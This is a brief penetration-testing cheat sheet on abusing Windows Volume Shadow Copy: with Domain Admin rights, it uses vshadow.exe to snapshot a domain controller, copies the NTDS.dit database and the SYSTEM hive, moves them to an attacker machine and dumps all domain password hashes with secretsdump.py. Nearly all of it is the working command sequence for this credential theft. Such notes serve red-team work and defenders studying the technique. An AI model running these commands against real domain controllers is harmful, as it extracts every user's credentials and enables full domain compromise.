# Shadow Copy

## What is a Shadow Copy

A [_Shadow Copy_](https://en.wikipedia.org/wiki/Shadow\_Copy), also known as _Volume Shadow Service_ (VSS) is a Microsoft backup technology that allows the creation of snapshots of files or entire volumes.

To manage volume shadow copies, the Microsoft signed binary [_vshadow.exe_](https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample) is offered as part of the [Windows SDK](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/).

When we are Domain Admin, we can create Shadow Copy to extract NTDS.dit database file and recover all domain passwords offline.

## How to do

* Connect on a domain controller as member of domain admin group
* Input the following commands :

```
vshadow.exe -nw -p  C:
```

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```

```
reg.exe save hklm\system c:\system.bak
```

* Transfer those files on our pwn box
* Dump credentials using secretsdump.py

<pre><code><strong>secretsdump.py -ntds ntds.dit.bak -system system.bak LOCAL
</strong></code></pre>
